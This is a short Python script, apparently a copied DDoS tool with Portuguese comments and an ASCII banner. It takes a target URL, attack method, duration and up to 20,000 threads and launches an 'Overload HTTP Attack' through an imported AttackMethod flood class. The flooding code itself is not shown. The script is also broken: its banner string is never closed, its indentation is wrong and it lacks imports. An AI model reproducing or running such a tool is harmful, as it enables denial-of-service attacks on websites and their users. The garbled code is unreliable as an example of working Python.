# Feito por LE CUONG
# Importa os modulos

import random
import threading
import socket
import os
import time
from termcolor import colored

print(colored(r"""
tool by Le Cuong Tricker Piano

 _____ _____  ____   ____   ____ _______ 
|_   _|  __ \|  _ \ / __ \ / __ \__   __|
  | | | |__) | |_) | |  | | |  | | | |   
  | | |  ___/|  _ <| |  | | |  | | | |   
 _| |_| |    | |_) | |__| | |__| | | |   
|_____|_|    |____/ \____/ \____/  |_| 
   
# Vai ao 
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Falha ao importar alguns modulos", err)
    sys.exit(1)
    
    # Analisa args
    parser = argparse.ArgumentParser(description="Overload HTTP Attack")
parser.add_argument(
    "--target",
    type=str,
    metavar="<URL>",
    help="Target URL",
)
parser.add_argument(
    "--method",
    type=str,
    metavar="<HTTP>",
    help="Attack method",
)
parser.add_argument(
 "--time", type=int, default=40000, metavar="<time>", help="tempo em segundos"
)
parser.add_argument(
    "--threads", type=int, default=20000, metavar="<threads>", help="contagem de threads (1-20000)"
    )
    
    # Obtem args
    args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target

if __name__ == "__main__":
    # Print help
    if not method or not target or not time:
        parser.print_help()
        sys.exit(1)

    # Executa ataque DDOS
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
